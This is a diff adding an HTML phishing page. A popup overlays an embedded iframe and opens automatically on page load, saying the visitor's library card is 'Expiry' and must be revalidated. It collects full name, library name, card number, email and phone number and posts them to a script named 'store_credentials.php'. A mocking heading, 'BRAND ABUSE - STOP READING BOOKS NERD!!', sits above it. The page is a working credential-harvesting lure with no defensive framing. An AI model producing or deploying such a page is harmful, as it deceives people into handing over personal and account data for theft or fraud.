@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<h4>BRAND ABUSE - STOP READING BOOKS NERD!!</h4>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsive Iframe with Popup Form</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: "Poppins", sans-serif;
+        }
+
+        .iframe-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio (change to match your video's aspect ratio) */
+            overflow: hidden;
+        }
+
+        .iframe-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            z-index: 9999;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4); /* Dark semi-transparent background */
+        }
+
+        .form-content {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .form-field {
+            margin-bottom: 20px;
+        }
+
+        .form-field label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .form-field input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            background-color: #00508B;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 12px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #003459;
+        }
+
+        .form-heading {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="iframe-container">
+        <!-- Replace 'your_iframe_url_here' with the URL of your iframe content -->
+        <iframe src="https://example.com" frameborder="0" allowfullscreen></iframe>
+    </div>
+
+    <!-- Popup content -->
+       <!-- Popup content -->
+    <div class="form-container" id="popupForm">
+        <div class="form-content">
+            <div class="form-heading">Your Library Card is Expiry Kindly Revalidate</div>
+            <form action="store_credentials.php" method="post" class="form-content"> <!-- Updated action attribute -->
+                <div class="form-field">
+                    <label for="fullName">Full Name:</label>
+                    <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
+                </div>
+                <div class="form-field">
+                    <label for="libraryName">Library Name:</label>
+                    <input type="text" id="libraryName" name="libraryName" placeholder="Enter library name" required>
+                </div>
+                <div class="form-field">
+                    <label for="libraryCardNo">Library Card No.:</label>
+                    <input type="text" id="libraryCardNo" name="libraryCardNo" placeholder="Enter library card number" required>
+                </div>
+                <div class="form-field">
+                    <label for="emailAddress">Email Address:</label>
+                    <input type="email" id="emailAddress" name="emailAddress" placeholder="Enter your email address" required>
+                </div>
+                <div class="form-field">
+                    <label for="contactNumber">Contact Number:</label>
+                    <input type="tel" id="contactNumber" name="contactNumber" placeholder="Enter your contact number" required>
+                </div>
+                <button type="submit" class="submit-btn">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Function to show the popup form
+        function showPopupForm() {
+            document.getElementById("popupForm").style.display = "flex";
+        }
+
+        // Automatically show the popup form on page load
+        document.addEventListener("DOMContentLoaded", function () {
+            showPopupForm();
+        });
+    </script>
+
+</body>
+</html>
